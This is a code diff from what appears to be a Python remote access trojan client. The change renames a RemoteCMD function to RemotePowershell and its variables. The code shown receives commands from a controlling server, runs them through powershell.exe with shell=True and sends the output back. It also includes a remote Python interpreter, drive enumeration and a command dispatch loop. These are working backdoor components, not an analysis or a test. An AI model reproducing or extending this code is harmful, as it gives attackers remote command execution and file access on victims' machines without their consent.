@@ -99,7 +99,7 @@ def PythonInterpreter():
     except Exception as e:
         send(f"Error: ({e})".encode())
 
-def RemoteCMD():
+def RemotePowershell():
     send(bytes(os.getcwd(), "utf-8"))
     while (True):
         ServerCommand = recv(buffer).decode()
@@ -108,12 +108,12 @@ def RemoteCMD():
 
         if (len(ServerCommand) > 0):
             PS_Command = subprocess.Popen(["powershell.exe", ServerCommand], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            CMD_Output = PS_Command.stdout.read() + PS_Command.stderr.read()
+            Powershell_Output = PS_Command.stdout.read() + PS_Command.stderr.read()
         else:
-            CMD_Output = b"Error Occured"
+            Powershell_Output = b"Error Occured"
 
-        send(bytes(str(len(CMD_Output)), "utf-8")); time.sleep(0.3)
-        send(CMD_Output)
+        send(bytes(str(len(Powershell_Output)), "utf-8")); time.sleep(0.3)
+        send(Powershell_Output)
 
 def ViewFiles():
     drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
@@ -165,8 +165,8 @@ while (True):
         elif (ServerCommand == "python-interpreter"):
             PythonInterpreter()
 
-        elif (ServerCommand == "remote-cmd"):
-            RemoteCMD()
+        elif (ServerCommand == "remote-powershell"):
+            RemotePowershell()
 
         elif (ServerCommand == "current-dir"):
             send(os.getcwd().encode())
